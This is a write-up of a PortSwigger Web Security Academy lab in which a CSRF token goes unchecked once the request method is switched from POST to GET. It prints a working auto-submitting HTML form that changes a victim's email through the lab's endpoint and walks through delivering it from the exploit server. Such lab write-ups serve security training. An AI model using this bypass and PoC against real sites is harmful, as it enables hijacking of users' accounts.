## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/30d2d7e7-1e0c-46aa-b405-b2693e4f41e5)

## Solution :

Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/3ef32f4e-a43b-4223-91fe-0d996079a0ed)

Send the request to Burp Repeater and observe that if you change the value of the csrf parameter then the request is rejected.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/008933d8-bef0-4614-86a1-215caee69fd6)

Use "Change request method" on the context menu to convert it into a GET request and observe that the CSRF token is no longer verified.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d5f06e23-7e8e-46b1-800f-faafa6fa642c)

Right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".and then i changed the email from `cyber` to `ananthan`. 

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/8436e8d0-f46c-438c-818f-0db1ca9a8baa)

geneted the payload.

```html

<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="https://0af800c404f6969f835dfa0800440082.web-security-academy.net/my-account/change-email">

      <input type="hidden" name="email" value="ananthan&#64;gmail&#46;com" />

      <input type="submit" value="Submit request" />

    </form>

    <script>

      history.pushState('', '', '/');

      document.forms[0].submit();

    </script>

  </body>

</html>

```

Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/a857160b-9ac4-48ac-866f-b43b6ffd37e0)

To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/567b2b1e-ed57-40bb-a5de-390b1892149a)

 "Deliver to victim" to solve the lab.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/dbf34b91-597e-4c24-a408-5c8169f00118)

 
